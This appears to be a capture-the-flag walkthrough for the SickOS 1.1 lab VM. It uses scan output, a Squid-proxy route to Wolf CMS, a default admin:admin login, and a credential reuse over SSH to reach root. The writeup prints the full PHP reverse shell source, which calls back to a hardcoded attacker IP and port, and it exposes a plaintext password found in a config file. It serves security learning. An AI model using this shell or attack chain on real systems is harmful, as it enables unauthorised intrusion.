# SickOS V1.1

Netdiscover result:

     Currently scanning: 192.168.79.0/16   |   Screen View: Unique Hosts                                                 

     4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 204                                                     
     _____________________________________________________________________________
       IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
     -----------------------------------------------------------------------------
     192.168.42.36   08:00:27:c0:67:ce      2     120  PCS Systemtechnik GmbH                                            
     192.168.42.129  42:fd:72:f9:05:21      2      84  Unknown vendor 


Nmap result:

    # nmap -sS -sV -p- -A 192.168.42.36
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 16:38 IST
    Nmap scan report for 192.168.42.36
    Host is up (0.00057s latency).
    Not shown: 65532 filtered tcp ports (no-response)
    PORT     STATE  SERVICE    VERSION
    22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 093d29a0da4814c165141e6a6c370409 (DSA)
    |   2048 8463e9a88e993348dbf6d581abf208ec (RSA)
    |_  256 51f6eb09f6b3e691ae36370cc8ee3427 (ECDSA)
    3128/tcp open   http-proxy Squid http proxy 3.1.19
    |_http-title: ERROR: The requested URL could not be retrieved
    | http-open-proxy: Potentially OPEN proxy.
    |_Methods supported: GET HEAD
    |_http-server-header: squid/3.1.19
    8080/tcp closed http-proxy
    MAC Address: 08:00:27:C0:67:CE (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.57 ms 192.168.42.36

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 133.50 seconds

Open the ip in the browser after changing the proxy of the browser to access the network.

![image](https://github.com/keerthiprabup/VM/assets/116485904/c2e942e1-fd49-4c21-b788-cdd0ab1daf1d)


We will get the ip page as:
![image](https://github.com/keerthiprabup/VM/assets/116485904/4adb1db3-1ec9-4ea4-ac86-9cb3e6f5c695)

Putting /robots.txt in the ip
![image](https://github.com/keerthiprabup/VM/assets/116485904/6bbf6789-8eee-4caf-b598-39cc92959a4b)

We got a dir /wolfcms

Open it by pasting it in the domain:

![image](https://github.com/keerthiprabup/VM/assets/116485904/7a217b67-a6c3-4467-bd7b-a19849c17677)

Wolf CMS is an open-source content management system (CMS) designed to make it easier for users to build and manage websites. 

Surfing through some wolfcms made websites we could figure out the pattern of url for login page:

    http://192.168.42.36/wolfcms/admin/login
But it won't work!

We can try passing it as an argument:

    http://192.168.42.36/wolfcms/?/admin/login
Now we got an login page:
![image](https://github.com/keerthiprabup/VM/assets/116485904/e2f59e78-f17b-4a4f-a7ad-7416fb9f4b45)

We can try some default sql passwords:

Here admin:admin worked!!

![image](https://github.com/keerthiprabup/VM/assets/116485904/b7d4b3c8-fa2d-49de-ad6c-43df0869be4d)


Now we are logged in.

Here we could upload files:
![image](https://github.com/keerthiprabup/VM/assets/116485904/74556301-1c31-4098-9667-3b5a6550b6a9)

The php reverse shell script I used to upload:


        <?php
        // php-reverse-shell - A Reverse Shell implementation in PHP
        // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
        //
        // This tool may be used for legal purposes only.  Users take full responsibility
        // for any actions performed using this tool.  The author accepts no liability
        // for damage caused by this tool.  If these terms are not acceptable to you, then
        // do not use this tool.
        //
        // In all other respects the GPL version 2 applies:
        //
        // This program is free software; you can redistribute it and/or modify
        // it under the terms of the GNU General Public License version 2 as
        // published by the Free Software Foundation.
        //
        // This program is distributed in the hope that it will be useful,
        // but WITHOUT ANY WARRANTY; without even the implied warranty of
        // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        // GNU General Public License for more details.
        //
        // You should have received a copy of the GNU General Public License along
        // with this program; if not, write to the Free Software Foundation, Inc.,
        // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
        //
        // This tool may be used for legal purposes only.  Users take full responsibility
        // for any actions performed using this tool.  If these terms are not acceptable to
        // you, then do not use this tool.
        //
        // You are encouraged to send comments, improvements or suggestions to
        // me at pentestmonkey@pentestmonkey.net
        //
        // Description
        // -----------
        // This script will make an outbound TCP connection to a hardcoded IP and port.
        // The recipient will be given a shell running as the current user (apache normally).
        //
        // Limitations
        // -----------
        // proc_open and stream_set_blocking require PHP version 4.3+, or 5+
        // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
        // Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
        //
        // Usage
        // -----
        // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

        set_time_limit (0);
        $VERSION = "1.0";
        $ip = '192.168.42.252';  // CHANGE THIS
        $port = 1234;       // CHANGE THIS
        $chunk_size = 1400;
        $write_a = null;
        $error_a = null;
        $shell = 'uname -a; w; id; /bin/sh -i';
        $daemon = 0;
        $debug = 0;

        //
        // Daemonise ourself if possible to avoid zombies later
        //

        // pcntl_fork is hardly ever available, but will allow us to daemonise
        // our php process and avoid zombies.  Worth a try...
        if (function_exists('pcntl_fork')) {
              // Fork and have the parent process exit
              $pid = pcntl_fork();

              if ($pid == -1) {
                    printit("ERROR: Can't fork");
                    exit(1);
              }

              if ($pid) {
                    exit(0);  // Parent exits
              }

              // Make the current process a session leader
              // Will only succeed if we forked
              if (posix_setsid() == -1) {
                    printit("Error: Can't setsid()");
                    exit(1);
              }

              $daemon = 1;
        } else {
              printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
        }

        // Change to a safe directory
        chdir("/");

        // Remove any umask we inherited
        umask(0);

        //
        // Do the reverse shell...
        //

        // Open reverse connection
        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
        if (!$sock) {
              printit("$errstr ($errno)");
              exit(1);
        }

        // Spawn shell process
        $descriptorspec = array(
           0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
           1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
           2 => array("pipe", "w")   // stderr is a pipe that the child will write to
        );

        $process = proc_open($shell, $descriptorspec, $pipes);

        if (!is_resource($process)) {
              printit("ERROR: Can't spawn shell");
              exit(1);
        }

        // Set everything to non-blocking
        // Reason: Occsionally reads will block, even though stream_select tells us they won't
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);

        printit("Successfully opened reverse shell to $ip:$port");

        while (1) {
              // Check for end of TCP connection
              if (feof($sock)) {
                    printit("ERROR: Shell connection terminated");
                    break;
              }

              // Check for end of STDOUT
              if (feof($pipes[1])) {
                    printit("ERROR: Shell process terminated");
                    break;
              }

              // Wait until a command is end down $sock, or some
              // command output is available on STDOUT or STDERR
              $read_a = array($sock, $pipes[1], $pipes[2]);
              $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

              // If we can read from the TCP socket, send
              // data to process's STDIN
              if (in_array($sock, $read_a)) {
                    if ($debug) printit("SOCK READ");
                    $input = fread($sock, $chunk_size);
                    if ($debug) printit("SOCK: $input");
                    fwrite($pipes[0], $input);
              }

              // If we can read from the process's STDOUT
              // send data down tcp connection
              if (in_array($pipes[1], $read_a)) {
                    if ($debug) printit("STDOUT READ");
                    $input = fread($pipes[1], $chunk_size);
                    if ($debug) printit("STDOUT: $input");
                    fwrite($sock, $input);
              }

              // If we can read from the process's STDERR
              // send data down tcp connection
              if (in_array($pipes[2], $read_a)) {
                    if ($debug) printit("STDERR READ");
                    $input = fread($pipes[2], $chunk_size);
                    if ($debug) printit("STDERR: $input");
                    fwrite($sock, $input);
              }
        }

        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);

        // Like print, but does nothing if we've daemonised ourself
        // (I can't figure out how to redirect STDOUT like a proper daemon)
        function printit ($string) {
              if (!$daemon) {
                    print "$string\n";
              }
        }

        ?> 
Upload the reverse shell script


You will get the php script uploaded and you can access it in the url
          
          http://192.168.42.36/wolfcms/public/
Open netcat in our terminal on the port 1234 and then open the link in the browser so that reverse shell can be obtained

Boom we get the reverse shell!!

We got some creds inside in the file config.php from the dir:
          
          /var/www/wolfcms/
![image](https://github.com/keerthiprabup/VM/assets/116485904/c0c1df91-5a4c-4ec9-a1db-63ac79c82a9e)


The passwd showed us a new user sickos
![image](https://github.com/keerthiprabup/VM/assets/116485904/e33d41aa-b4cb-4532-b70c-0a2781a8a92a)

We also have ssh server running on port 22. So we can try the user creds on that.

The password for the sickos user in ssh is 'john@123' that we get from the config file.


Open a new terminal and execute the command;
          
          ssh sickos@192.168.42.36 -p 22

After getting the shell putting the command sudo su directs you to the root shell
![image](https://github.com/keerthiprabup/VM/assets/116485904/794998e0-1bd5-4ac2-b145-9c09a5fb063d)

The flag is at dir /root/a0216ea4d51874464078c618298b1367.txt given in the challenge description.
![image](https://github.com/keerthiprabup/VM/assets/116485904/b304742e-200d-4047-9a0b-2e0e41fe0d72)

